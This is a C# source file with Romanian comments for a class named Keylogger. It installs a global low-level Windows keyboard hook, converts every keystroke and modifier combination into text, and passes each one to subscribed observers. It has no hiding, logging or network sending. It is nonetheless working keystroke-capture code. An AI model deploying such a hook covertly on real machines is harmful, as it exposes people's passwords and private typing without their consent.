﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Keylogger
{
    /// <summary>
    /// clasa care captureaza apasarile de taste si notifica observatorii
    /// </summary>
    public class Keylogger : IObservable<KeyEvent>, IDisposable
    {
        // lista cu observatori
        private readonly List<IObserver<KeyEvent>> _observers = new List<IObserver<KeyEvent>>();
        // id hook tastatura
        private IntPtr _hookID;
        // delegate pt callback hook
        private LowLevelKeyboardProc _hookProc;
        // flag daca s-au eliberat resursele
        private bool _disposed = false;
        // flag daca e activ loggerul
        private bool _isActive = false;

        // hook tastatura low level
        private const int WH_KEYBOARD_LL = 13;
        // cod pentru keydown normal
        private const int WM_KEYDOWN = 0x0100;
        // cod pentru alt + tasta
        private const int WM_SYSKEYDOWN = 0x0104;

        // delegate pentru hook
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);


        /// <summary>
        /// returneaza true daca keyloggerul e activ
        /// </summary>
        public bool IsActive
        {
            get => _isActive;
            set => _isActive = value;
        }

        /// <summary>
        /// constructorul seteaza hookul tastaturii
        /// </summary>
        public Keylogger()
        {
            _hookProc = HookCallback;
            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _hookProc, GetModuleHandle(null), 0);
            if (_hookID == IntPtr.Zero)
            {
                throw new Win32Exception(Marshal.GetLastWin32Error());
            }
        }

        /// <summary>
        /// metoda chemata la fiecare tasta apasata
        /// </summary>
        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && _isActive && !_disposed)
            {
                bool isKeyDown = (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN);
                if (isKeyDown)
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    Keys key = (Keys)vkCode;

                    bool isShiftPressed = (GetAsyncKeyState(Keys.ShiftKey) & 0x8000) != 0;
                    bool isAltPressed = (GetAsyncKeyState(Keys.Menu) & 0x8000) != 0;
                    bool isCtrlPressed = (GetAsyncKeyState(Keys.ControlKey) & 0x8000) != 0;

                    string keyName = GetKeyName(key, isShiftPressed);

                    if (key != Keys.ShiftKey && key != Keys.LShiftKey && key != Keys.RShiftKey &&
                        key != Keys.Menu && key != Keys.LMenu && key != Keys.RMenu &&
                        key != Keys.ControlKey && key != Keys.LControlKey && key != Keys.RControlKey)
                    {
                        if (isCtrlPressed) keyName = "[Ctrl] + " + keyName;
                        if (isAltPressed) keyName = "[Alt] + " + keyName;
                        // elimina prefixurile de shift daca tasta deja le are
                        if (isShiftPressed && !IsKeyAlreadyShifted(key) && !(key >= Keys.A && key <= Keys.Z))
                            keyName = "[Shift] + " + keyName;
                    }

                    var keyEvent = new KeyEvent { Key = keyName };

                    foreach (var observer in _observers.ToArray())
                    {
                        observer.OnNext(keyEvent);
                    }
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// verifica daca shift modifica deja tasta
        /// </summary>
        private bool IsKeyAlreadyShifted(Keys key)
        {
            return key == Keys.OemQuestion || key == Keys.Oemtilde || key == Keys.OemPipe ||
                   key == Keys.OemQuotes || key == Keys.OemOpenBrackets || key == Keys.OemCloseBrackets ||
                   key == Keys.OemBackslash || key == Keys.OemMinus || key == Keys.Oemplus ||
                   key == Keys.OemPeriod || key == Keys.Oemcomma || key == Keys.OemSemicolon ||
                   key == Keys.D1 || key == Keys.D2 || key == Keys.D3 || key == Keys.D4 ||
                   key == Keys.D5 || key == Keys.D6 || key == Keys.D7 || key == Keys.D8 ||
                   key == Keys.D9 || key == Keys.D0;
        }

        /// <summary>
        /// intoarce string-ul pentru tasta, in functie de shift
        /// </summary>
        private string GetKeyName(Keys key, bool isShiftPressed)
        {
            switch (key)
            {
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                    return "[Shift]";
                case Keys.LMenu:
                case Keys.RMenu:
                    return "[Alt]";
                case Keys.LControlKey:
                case Keys.RControlKey:
                    return "[Ctrl]";
                case Keys.LWin:
                case Keys.RWin:
                    return "[Win]";
                case Keys.D1:
                    return isShiftPressed ? "!" : "1";
                case Keys.D2:
                    return isShiftPressed ? "@" : "2";
                case Keys.D3:
                    return isShiftPressed ? "#" : "3";
                case Keys.D4:
                    return isShiftPressed ? "$" : "4";
                case Keys.D5:
                    return isShiftPressed ? "%" : "5";
                case Keys.D6:
                    return isShiftPressed ? "^" : "6";
                case Keys.D7:
                    return isShiftPressed ? "&" : "7";
                case Keys.D8:
                    return isShiftPressed ? "*" : "8";
                case Keys.D9:
                    return isShiftPressed ? "(" : "9";
                case Keys.D0:
                    return isShiftPressed ? ")" : "0";
                case Keys.OemQuestion:
                    return isShiftPressed ? "?" : "/";
                case Keys.Oemtilde:
                    return isShiftPressed ? "~" : "`";
                case Keys.OemPipe:
                    return isShiftPressed ? "|" : "\\";
                case Keys.OemQuotes:
                    return isShiftPressed ? "\"" : "'";
                case Keys.OemOpenBrackets:
                    return isShiftPressed ? "{" : "[";
                case Keys.OemCloseBrackets:
                    return isShiftPressed ? "}" : "]";
                case Keys.OemMinus:
                    return isShiftPressed ? "_" : "-";
                case Keys.Oemplus:
                    return isShiftPressed ? "+" : "=";
                case Keys.OemPeriod:
                    return isShiftPressed ? ">" : ".";
                case Keys.Oemcomma:
                    return isShiftPressed ? "<" : ",";
                case Keys.OemSemicolon:
                    return isShiftPressed ? ":" : ";";
                case Keys.Space:
                    return "[Space]";
                case Keys.Enter:
                    return "[Enter]";
                case Keys.Back:
                    return "[Backspace]";
                case Keys.Tab:
                    return "[Tab]";
                case Keys.Escape:
                    return "[Esc]";
                case Keys.CapsLock:
                    return "[Caps Lock]";
                case Keys.NumLock:
                    return "[Num Lock]";
                case Keys.Scroll:
                    return "[Scroll Lock]";
                case Keys.Insert:
                    return "[Insert]";
                case Keys.Delete:
                    return "[Delete]";
                case Keys.Home:
                    return "[Home]";
                case Keys.End:
                    return "[End]";
                case Keys.PageUp:
                    return "[PgUp]";
                case Keys.PageDown:
                    return "[PgDn]";
                case Keys.Left:
                    return "[Left]";
                case Keys.Right:
                    return "[Right]";
                case Keys.Up:
                    return "[Up]";
                case Keys.Down:
                    return "[Down]";
                case Keys.PrintScreen:
                    return "[PrtSc]";
                case Keys.Pause:
                    return "[Pause]";
                default:
                    if (key >= Keys.A && key <= Keys.Z)
                    {
                        bool shouldUppercase = isShiftPressed ^ IsCapsLockOn; 
                        return shouldUppercase ? key.ToString() : key.ToString().ToLower();
                    }
                    return key.ToString();
            }
        }

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]

        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        protected virtual bool IsCapsLockOn => (GetKeyState(0x14) != 0); //caps

        /// <summary>
        /// metoda prin care se aboneaza un observer
        /// </summary>
        public IDisposable Subscribe(IObserver<KeyEvent> observer)
        {
            if (!_observers.Contains(observer))
                _observers.Add(observer);
            return new Unsubscriber(_observers, observer);
        }

        /// <summary>
        /// elibereaza resursele
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        /// <summary>
        /// metoda protected pt dispose
        /// </summary>
        protected virtual void Dispose(bool disposing)
        {
            if (!_disposed)
            {
                if (_hookID != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(_hookID);
                    _hookID = IntPtr.Zero;
                }
                _disposed = true;
            }
        }

        /// <summary>
        /// destructorul clasei
        /// </summary>
        ~Keylogger()
        {
            Dispose(false);
        }

        /// <summary>
        /// clasa interna pt dezabonare observeri
        /// </summary>
        private class Unsubscriber : IDisposable
        {
            private readonly List<IObserver<KeyEvent>> _observers;
            private readonly IObserver<KeyEvent> _observer;

            /// <summary>
            /// constructorul primeste lista si observerul de sters
            /// </summary>
            public Unsubscriber(List<IObserver<KeyEvent>> observers, IObserver<KeyEvent> observer)
            {
                _observers = observers;
                _observer = observer;
            }

            /// <summary>
            /// scoate observerul din lista
            /// </summary>
            public void Dispose()
            {
                if (_observer != null && _observers.Contains(_observer))
                    _observers.Remove(_observer);
            }
        }
    }
}
